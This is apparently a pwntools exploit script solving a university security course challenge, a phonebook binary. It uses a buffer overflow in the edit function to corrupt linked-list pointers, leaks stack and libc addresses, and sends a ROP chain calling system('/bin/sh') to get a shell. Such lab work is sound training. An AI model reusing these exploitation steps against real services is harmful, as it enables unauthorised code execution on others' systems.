#!/usr/bin/env python3

import pwn

# this is required on gnome to start gdb
pwn.context.terminal = ['gnome-terminal', '--']

# pwninit
exe = pwn.ELF("./vuln_patched")
libc = pwn.ELF("./libc.so.6")
ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'
#pwn.context.binary = exe

port = 1024
#conn = pwn.remote('tasks.ws24.softsec.rub.de', port)
conn = pwn.process([exe.path])

#pwn.gdb.attach(conn, gdbscript="""
#set detach-on-fork off
#set follow-fork-mode child
#""")

# in phonebook_edit we have a buffer overflow in name
# we can write 80 bytes, but name only has 48

# thus we can write into phonebook_entry that is located right after ours and override the next and prev pointer

# when we delete this entry and:
# prev = NULL
# next = address_of_our_choise
# then then global phonebook var points to an address of our choice

# then we can edit index 0 and write phone_number and name => write ropchain on stack

# we get stack address for free at the start
conn.recvuntil(b'Welcome to the softsec phonebook service. Your phone number is +')
stack_command = conn.recvline()
print(stack_command)
stack_command = int(stack_command[:-1], 10)
print(stack_command)
print(hex(stack_command))

# add stack into global phonebook pointer (maybe when we print it, we leak libc later)
def create_entry(name: bytes):
    conn.sendlineafter(b'> ', b'A')
    conn.sendlineafter(b'Phone number: ', b'+49123')
    conn.sendlineafter(b'Name: ', name)

# create two
create_entry(b'entry 1')
create_entry(b'entry 2')

# we edit entry 1 to overflow into entry 1
def edit_entry(index: bytes, name: bytes):
    conn.sendlineafter(b'> ', b'E')
    conn.sendlineafter(b'Index: ', index)
    conn.sendlineafter(b'Phone number: ', b'+491234')
    conn.sendlineafter(b'Name: ', name)

# 7*8 bytes above our leaked pointer is libc address, which we can read
new_name = b'A'*48 + pwn.p64(0x71) + pwn.p64(0x0) + pwn.p64(stack_command+3*8)
edit_entry(index=b'1', name=new_name)

conn.sendlineafter(b'> ', b'S')
conn.sendlineafter(b'Index: ', b'1')
conn.recvuntil(b'Name: ')
leaked_libc = conn.recv(6)
leaked_libc = pwn.u64(leaked_libc + b'\x00\x00')

libc.address = (leaked_libc + 0x38) - (libc.symbols['__libc_start_main'] + 2)
print(f'libc at: {hex(libc.address)}')

# edit phonebook
rop = pwn.ROP(libc)
rop.call(rop.ret) 
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
edit_entry(index=b'1', name = rop.chain())

# trigger ropchain by returning
conn.sendlineafter(b'> ', b'Q')

# enjoy your shell
conn.interactive()
